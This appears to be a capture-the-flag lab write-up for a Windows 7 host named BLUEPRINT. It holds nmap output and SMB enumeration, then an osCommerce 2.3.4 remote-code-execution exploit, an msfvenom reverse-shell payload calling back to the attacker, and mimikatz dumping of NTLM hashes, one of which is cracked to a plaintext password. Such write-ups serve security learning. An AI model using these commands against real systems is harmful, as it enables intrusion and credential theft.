## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.97.119
# HOSTNAME  //Found Post Initial Enumeration
BLUEPRINT
# OPERATING SYSTEM  //Found Post Initial Enumeration
OS Name:                   Microsoft Windows 7 Home Basic                                     
OS Version:                6.1.7601 Service Pack 1 Build 7601        
# CREDENTIALS  
30e87bf999828446a1c1209ddde4c450:googleplus
```
## OPEN PORTS DETAILS
```bash
80/tcp    open  http         syn-ack ttl 125 Microsoft IIS httpd 7.5
443/tcp   open  ssl/http     syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
8080/tcp  open  http         syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)

135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

3306/tcp  open  mysql        syn-ack ttl 125 MariaDB 10.3.23 or earlier (unauthorized)

49152/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
```
# ENUMERATION
## PORT 139 445
```bash
sudo crackmapexec smb $ip --shares -u 'anonymous' -p ''
SMB         10.10.97.119    445    BLUEPRINT        [*] Windows 7 Home Basic 7601 Service Pack 1 (name:BLUEPRINT) (domain:BLUEPRINT) (signing:False) (SMBv1:True)
SMB         10.10.97.119    445    BLUEPRINT        [+] BLUEPRINT\anonymous: 
SMB         10.10.97.119    445    BLUEPRINT        [+] Enumerated shares
SMB         10.10.97.119    445    BLUEPRINT        Share           Permissions     Remark
SMB         10.10.97.119    445    BLUEPRINT        -----           -----------     ------
SMB         10.10.97.119    445    BLUEPRINT        ADMIN$                          Remote Admin
SMB         10.10.97.119    445    BLUEPRINT        C$                              Default share
SMB         10.10.97.119    445    BLUEPRINT        IPC$                            Remote IPC
SMB         10.10.97.119    445    BLUEPRINT        Users           READ            
SMB         10.10.97.119    445    BLUEPRINT        Windows                         

sudo smbclient //$ip/Users                                    
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 12 04:06:40 2019
  ..                                 DR        0  Fri Apr 12 04:06:40 2019
  Default                           DHR        0  Tue Jul 14 12:47:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:11:57 2009
  Public                             DR        0  Tue Jul 14 10:11:57 2009

```
## PORT 80 443 8080
```bash
# Port 80
http://10.10.97.119/
- 404 - File or directory not found.
# Port 443
https://10.10.97.119/
- Found oscommerce-2.3.4/ 	
# Port 8080
https://10.10.97.119:8080/
- Found oscommerce-2.3.4/ 	
```
## INITIAL FOOTHOLD
```bash
# Exploit 
- Found exploit 
- osCommerce 2.3.4.1 - Remote Code Execution (2)| php/webapps/50128.py

- Exploit Worked on Port 8080
sudo python3 50128.py http://10.10.97.119:8080/oscommerce-2.3.4/catalog 
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system

# Proper shell
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.13.80.25 LPORT=80 -f exe -o shell.exe
- Transfer and execute
```
## PRIVILEGE ESCALATION
```bash
# Dump hashes using mimikatz.exe
- Transfer mimikatz.exe
mimikatz # privilege::debug              
Privilege '20' OK          

mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

# Crack NTLM Hash
https://crackstation.net/
30e87bf999828446a1c1209ddde4c450:googleplus
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Tue Feb 25 14:52:21 2025 as: /usr/lib/nmap/nmap -p 80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 -sC -sV -vv -oN nmap/scan-script-version 10.10.97.119
Nmap scan report for 10.10.97.119
Host is up, received echo-reply ttl 125 (0.37s latency).
Scanned at 2025-02-25 14:52:24 IST for 88s

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 125 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: Bad request!
| http-methods: 
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
445/tcp   open  microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack ttl 125 MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-25T09:20:54+00:00
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:cc:f0:9a:0c:9d (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02:cc:f0:9a:0c:9d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-02-25T09:20:54
|_  start_date: 2025-02-25T09:18:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2m38s, deviation: 1s, median: -2m39s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52705/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51352/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54950/udp): CLEAN (Timeout)
|   Check 4 (port 48568/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 25 14:53:52 2025 -- 1 IP address (1 host up) scanned in 91.00 seconds
```
